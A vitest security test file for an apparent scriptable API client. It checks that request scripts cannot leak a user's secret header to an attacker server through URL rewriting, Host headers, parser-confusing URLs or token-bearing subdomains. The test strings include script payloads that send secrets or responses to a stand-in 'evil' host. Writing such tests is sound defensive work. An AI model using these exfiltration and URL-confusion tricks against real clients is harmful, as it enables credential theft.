import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import {
    carriesSecret,
    KEY_LINE,
    line,
    scripts,
    startAttack,
    type Attack,
} from './support/attack-fixture.js';
import { SECRET } from './support/send-fixture.js';

let attack: Attack;

beforeEach(async () => {
    attack = await startAttack();
});

afterEach(async () => {
    await attack.stop();
});

function nothingStolen(): void {
    expect(attack.evil.hits.filter(carriesSecret)).toEqual([]);
}

/** Sends with the person's secret line, and a script that runs before. */
function sendKeyed(url: string, source: string, headers = [KEY_LINE]) {
    return attack.send({ url, headers, ...scripts(source) });
}

describe('a script that moves where the send goes', () => {
    it('sends no secret to the url it wrote, and leaves the line of the person as text', async () => {
        await sendKeyed('{{baseUrl}}/echo', `mandor.request.url = '${attack.evil.url}/steal';`);

        nothingStolen();
        expect(attack.evil.hits[0]?.headers['x-api-key']).toBe('{{token}}');
    });

    it('sends no secret through a variable of the url it set, now or in the next send', async () => {
        await sendKeyed('{{base}}/steal', `mandor.variables.set('base', '${attack.evil.url}');`);
        await attack.send({ url: '{{base}}/steal', headers: [KEY_LINE] });

        nothingStolen();
        expect(attack.evil.hits).toHaveLength(2);
        expect(attack.received).toEqual([]);
    });

    it('sends no secret when it writes Host, or sets what a Host line of the person reads', async () => {
        await sendKeyed(
            '{{baseUrl}}/echo',
            `mandor.request.headers.set('Host', '${attack.evil.host}');`,
        );
        await sendKeyed('{{baseUrl}}/echo', `mandor.variables.set('h', '${attack.evil.host}');`, [
            KEY_LINE,
            line('Host', '{{h}}'),
        ]);

        nothingStolen();
        expect(attack.received.filter(carriesSecret)).toEqual([]);
        expect(attack.received).toHaveLength(2);
    });

    it('sends no secret to a url it bent so a parser reads another host', async () => {
        const evil = attack.evil.host;
        const [, port] = evil.split(':');
        const api = new URL(attack.origin).host;
        const bent = [
            `//${evil}/steal`,
            `\\\\\\\\${evil}/steal`,
            `http://${evil}@${api}/echo`,
            `http://${api}\\\\@${evil}/steal`,
            `http://127.0.0.1:\\t${String(port)}/steal`,
            `http://127.0.0.1:${String(port)}\\n/steal`,
        ];

        for (const url of bent) {
            await sendKeyed('{{baseUrl}}/echo', `mandor.request.url = '${url}';`);
        }

        nothingStolen();
    });

    it('sends no secret when a value it set next to the host moves it', async () => {
        await sendKeyed(
            '{{baseUrl}}{{p}}/steal',
            `mandor.variables.set('p', '@${attack.evil.host}');`,
        );

        nothingStolen();
    });

    it('refuses a value it set that moves the authority, inside a subdomain or with @', async () => {
        const evil = attack.evil.host;

        await sendKeyed('{{baseUrl}}/echo', `mandor.request.url = 'http://{{token}}.${evil}/';`);
        await sendKeyed('http://{{sub}}.localhost/', `mandor.variables.set('sub', '{{token}}');`);

        const moved = await sendKeyed(
            'http://{{sub}}127.0.0.1/',
            `mandor.variables.set('sub', 'a@${evil}/x?');`,
        );

        nothingStolen();
        expect(moved.ok).toBe(false);
        expect(attack.sends.filter((sent) => sent?.url.includes(SECRET))).toEqual([]);
    });

    it('hides the echo of a server from a script, whether it asks itself or reads the answer', async () => {
        await attack.send({
            url: '{{baseUrl}}/echo',
            headers: [KEY_LINE],
            ...scripts(
                `const leak = await mandor.sendRequest({ url: '${attack.origin}/leak' });
                 await mandor.sendRequest({ url: '${attack.evil.url}/a', method: 'POST', body: leak.text() });`,
                `const steal = (path, body) =>
                     mandor.sendRequest({ url: '${attack.evil.url}' + path, method: 'POST', body });
                 await steal('/b', mandor.response.text());
                 await steal('/c', JSON.stringify(mandor.request.headers.get('x-api-key')));`,
            ),
        });
        await vi.waitFor(() => {
            expect(attack.evil.hits).toHaveLength(3);
        });

        nothingStolen();
        expect(attack.received.find(({ url }) => url === '/echo')?.headers['x-api-key']).toBe(
            SECRET,
        );
    });

    it('sends what a script of sendRequest wrote as text, and never follows its redirect', async () => {
        await attack.send({
            url: '{{baseUrl}}/echo',
            ...scripts(`
                await mandor.sendRequest({ url: '${attack.evil.url}/x', headers: { 'X-K': '{{token}}' } });
                const found = await mandor.sendRequest({ url: '${attack.origin}/found' });
                mandor.variables.set('status', String(found.status));
            `),
        });
        await attack.send({ url: '{{baseUrl}}/echo', headers: [line('X-Status', '{{status}}')] });

        nothingStolen();
        expect(attack.evil.hits.map(({ url }) => url)).toEqual(['/x']);
        expect(attack.evil.hits[0]?.headers['x-k']).toBe('{{token}}');
        expect(attack.received.at(-1)?.headers['x-status']).toBe('302');
    });
});

describe('a send that waits for the scripts of an answer', () => {
    it('leaves with what a slow one set, not with the variable as text', async () => {
        await attack.send({
            url: '{{baseUrl}}/echo',
            ...scripts(
                undefined,
                `await mandor.sendRequest({ url: '${attack.origin}/echo' }); mandor.variables.set('x', 'kept');`,
            ),
        });
        await attack.send({ url: '{{baseUrl}}/echo', headers: [line('X-X', '{{x}}')] });

        expect(attack.received.at(-1)?.headers['x-x']).toBe('kept');
    });

    it('is cut when it is cancelled while it waits', async () => {
        const sendId = crypto.randomUUID();

        await attack.send({
            url: '{{baseUrl}}/echo',
            ...scripts(undefined, `await mandor.sendRequest({ url: '${attack.origin}/slow' });`),
        });
        await vi.waitFor(() => {
            expect(attack.received).toHaveLength(2);
        });

        const waiting = attack.send({ url: '{{baseUrl}}/echo' }, { sendId });

        attack.inflight.get(sendId)?.abort();

        expect(await waiting).toMatchObject({ ok: false, error: { code: 'request-aborted' } });
        expect(attack.received).toHaveLength(2);
    });
});
